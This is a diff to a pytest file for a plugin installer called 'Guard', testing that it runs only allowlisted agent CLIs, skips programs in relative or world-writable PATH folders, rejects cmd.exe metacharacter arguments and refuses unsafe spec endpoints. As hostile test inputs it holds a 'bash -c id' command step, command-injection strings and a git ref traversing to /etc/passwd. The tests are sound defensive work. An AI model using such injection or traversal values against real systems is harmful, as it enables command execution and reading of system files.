-def test_only_allowed_programs_can_run(monkeypatch: pytest.MonkeyPatch, guard_home: Path) -> None:
+def test_only_guards_own_programs_can_run(runtimes: FakeRuntimes) -> None:
     plan = {
         "action": "install",
         "slug": "acme/toolgate",
@@ -262,9 +614,80 @@ def test_only_allowed_programs_can_run(monkeypatch: pytest.MonkeyPatch, guard_ho
             {"runtime": "codex", "program": "bash", "available": True, "automatic": True, "commands": [["bash"]]}
         ],
     }
-    monkeypatch.setattr(install.subprocess, "run", pytest.fail)
+    lookup = install.find_programs()
+    assert sorted(lookup.programs) == ["claude", "codex"]
+    outcomes = install.apply_plan(plan, lookup=lookup, assume_yes=True, record=pytest.fail)
+    assert [outcome.status for outcome in outcomes] == ["skipped"]
+    shape = {**plan, "steps": [{**plan["steps"][0], "program": "codex", "commands": [["bash", "-c", "id"]]}]}
     with pytest.raises(install.PluginInstallError):
-        install.apply_plan(plan, assume_yes=True, record=pytest.fail, which=lambda name: f"/bin/{name}")
+        install.apply_plan(shape, lookup=lookup, assume_yes=True, record=pytest.fail)
+    assert runtimes.ran == []
+
+
+def _program(folder: Path, name: str, mode: int = 0o755) -> Path:
+    folder.mkdir(parents=True, exist_ok=True)
+    path = folder / name
+    path.write_text("#!/bin/sh\n", encoding="utf-8")
+    path.chmod(mode)
+    return path
+
+
+@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
+def test_programs_come_only_from_absolute_folders_nobody_else_can_write(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    planted = _program(tmp_path / "work", "claude")
+    shared = tmp_path / "shared"
+    _program(shared, "claude")
+    shared.chmod(0o777)
+    loose = _program(tmp_path / "loose", "codex", 0o777)
+    real = _program(tmp_path / "real", "claude")
+    real_codex = _program(tmp_path / "real", "codex")
+    monkeypatch.chdir(tmp_path / "work")
+    lookup = runner.find_programs(("claude", "codex"), {"PATH": f".:{shared}:{loose.parent}:{tmp_path / 'real'}"})
+    assert lookup.programs["claude"].path == str(real)
+    assert lookup.programs["codex"].path == str(real_codex)
+    assert lookup.ignored == [
+        f"Guard ignored {planted}: it is in a relative PATH entry.",
+        f"Guard ignored {shared / 'claude'}: it is in a folder every user can write to.",
+        f"Guard ignored {loose}: every user can write to it.",
+    ]
+    shared.chmod(0o755)
+
+
+def test_windows_prefers_an_exe_ignores_the_current_folder_and_guards_shim_arguments(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    _program(tmp_path / "work", "claude.cmd")
+    npm = tmp_path / "npm"
+    _program(npm, "claude.cmd")
+    _program(npm, "claude.exe")
+    _program(npm, "codex.cmd")
+    monkeypatch.chdir(tmp_path / "work")
+    lookup = runner.find_programs(("claude", "codex"), {"PATH": f".;{npm}"}, windows=True)
+    claude, codex = lookup.programs["claude"], lookup.programs["codex"]
+    assert (claude.path, claude.batch) == (str(npm / "claude.exe"), False)
+    assert (codex.path, codex.batch) == (str(npm / "codex.cmd"), True)
+    assert lookup.ignored == [f"Guard ignored {tmp_path / 'work' / 'claude.cmd'}: it is in a relative PATH entry."]
+    runner.check_arguments(codex, ["plugin", "add", "toolgate@acme", "--ref", SCANNED])
+    runner.check_arguments(claude, ["name with space"])
+    for argument in ("a&b", "%PATH%", "a^b", "a|b", '"x"', "(x)", "x!", "a b", "a\tb", "", "a\x1bb"):
+        with pytest.raises(runner.RunnerError, match=r"cmd\.exe could read it as a command"):
+            runner.check_arguments(codex, ["plugin", "add", argument])
+
+
+def test_git_head_follows_symbolic_and_packed_refs(tmp_path: Path) -> None:
+    git = tmp_path / "repo" / ".git"
+    git.mkdir(parents=True)
+    (git / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
+    (git / "packed-refs").write_text(f"# pack-refs\n{SCANNED} refs/heads/main\n", encoding="utf-8")
+    assert install.git_head(tmp_path / "repo") == SCANNED
+    (git / "refs" / "heads").mkdir(parents=True)
+    (git / "refs" / "heads" / "main").write_text(f"{OTHER}\n", encoding="utf-8")
+    assert install.git_head(tmp_path / "repo") == OTHER
+    (git / "HEAD").write_text("ref: refs/../../../etc/passwd\n", encoding="utf-8")
+    assert install.git_head(tmp_path / "repo") is None
+    assert install.git_head(tmp_path / "missing") is None
 
 
 def test_telemetry_marks_only_listings_guard_installed(guard_home: Path) -> None:
@@ -319,26 +742,26 @@ def local_portal() -> Iterator[tuple[str, list[str]]]:
 
 
 def test_the_spec_endpoint_override_reaches_a_local_portal_and_says_so(
-    local_portal: tuple[str, list[str]], programs: list[list[str]], monkeypatch: pytest.MonkeyPatch
+    local_portal: tuple[str, list[str]], runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     endpoint, requests = local_portal
     monkeypatch.setenv(install.SPEC_URL_ENV, endpoint)
     exit_code, output, error = _run(["plugin", "install", "acme/toolgate", "--apply", "--yes", "--runtime", "codex"])
     assert exit_code == 0, error
-    assert requests == ["/api/guard/plugins/install-spec?slug=acme%2Ftoolgate"]
+    assert requests == ["/api/guard/plugins/install-spec?slug=acme%2Ftoolgate&schema=2"]
     assert f"Warning: {install.SPEC_URL_ENV} is set. Install details come from {endpoint}, not hol.org." in error
     origin = endpoint.removesuffix("api/guard/plugins/install-spec")
     assert f"Listing: {origin}registry/plugins/acme%2Ftoolgate" in output
-    assert programs[-1][1:] == ["plugin", "add", "toolgate@acme"]
+    assert runtimes.ran[-1] == ["codex", "plugin", "add", "toolgate@acme"]
 
     # The record kept the local listing, and uninstall plans from it through the same override.
     exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
     assert exit_code == 0, error
-    assert programs[-1][1:] == ["plugin", "remove", "toolgate@acme"]
+    assert runtimes.ran[-1] == ["codex", "plugin", "remove", "toolgate@acme"]
 
 
 def test_a_hol_org_listing_is_refused_once_the_endpoint_is_overridden(
-    local_portal: tuple[str, list[str]], spec_file: Path, programs: list[list[str]], monkeypatch: pytest.MonkeyPatch
+    local_portal: tuple[str, list[str]], spec_file: Path, runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     # The listing check follows the override instead of also accepting hol.org,
     # so a fixture endpoint cannot vouch for a listing it does not serve.
@@ -346,7 +769,7 @@ def test_a_hol_org_listing_is_refused_once_the_endpoint_is_overridden(
     exit_code, _output, error = _run(
         ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes"]
     )
-    assert (exit_code, programs) == (2, [])
+    assert (exit_code, runtimes.ran) == (4, [])
     assert "failed Guard's checks" in error
 
 
@@ -395,12 +818,12 @@ def test_uninstall_through_another_endpoint_names_the_mismatch(
     ],
 )
 def test_an_unsafe_spec_endpoint_override_is_refused_before_any_request(
-    value: str, programs: list[list[str]], monkeypatch: pytest.MonkeyPatch
+    value: str, runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
 ) -> None:
     monkeypatch.setenv(install.SPEC_URL_ENV, value)
     monkeypatch.setattr(install, "managed_urlopen", lambda *_a, **_k: pytest.fail("no request expected"))
     exit_code, output, error = _run(["plugin", "install", "acme/toolgate", "--apply", "--yes"])
-    assert (exit_code, output, programs) == (2, "", [])
+    assert (exit_code, output, runtimes.ran) == (2, "", [])
     assert f"{install.SPEC_URL_ENV} must be an https URL" in error
 
 
